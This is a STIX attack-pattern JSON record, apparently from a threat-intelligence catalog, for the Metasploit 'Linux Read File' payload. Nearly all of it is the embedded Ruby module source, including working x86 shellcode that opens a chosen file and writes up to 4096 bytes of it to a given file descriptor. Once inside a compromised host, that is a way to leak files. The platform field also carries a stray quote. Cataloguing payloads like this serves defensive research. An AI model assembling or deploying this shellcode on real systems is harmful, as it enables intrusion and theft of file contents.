{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0ba25d4e-8b12-40ca-93b6-f4caea1e49a1",
    "created": "2024-08-14T16:33:19.427517Z",
    "modified": "2024-08-14T16:33:19.427521Z",
    "name": "Linux Read File",
    "description": "Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/x86/read_file.rb",
            "external_id": "read_file.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n\n  CachedSize = 63\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Read File',\n      'Version'       => '',\n      'Description'   => 'Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor',\n      'Author'        => 'hal',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_X86))\n\n    # Register exec options\n    register_options(\n      [\n        OptString.new('PATH',   [ true,  \"The file path to read\" ]),\n        OptString.new('FD',     [ true,  \"The file descriptor to write output to\", 1 ]),\n      ])\n  end\n\n  def generate(opts={})\n    fd = datastore['FD']\n\n    payload_data =<<-EOS\n      jmp file\n\n      open:\n        mov eax,0x5       ; open() syscall\n        pop ebx           ; Holds the filename\n        xor ecx,ecx       ; Open for reading (0)\n        int 0x80\n\n      read:\n        mov ebx,eax       ; Store the open fd\n        mov eax,0x3       ; read() syscall\n        mov edi,esp       ; We're just going to save on the stack\n        mov ecx,edi       ; Save at edi\n        mov edx,0x1000    ; Read as much as we can\n        int 0x80\n\n      write:\n        mov edx,eax       ; Number of bytes to write\n        mov eax,0x4       ; write() system call\n        mov ebx,#{fd}     ; fd to write to\n        int 0x80\n\n      exit:\n        mov eax,0x1       ; exit() system call\n        mov ebx,0x0       ; return 0\n        int 0x80\n\n      file:\n        call open\n        db \"#{datastore['PATH']}\", 0x00\n    EOS\n\n    Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}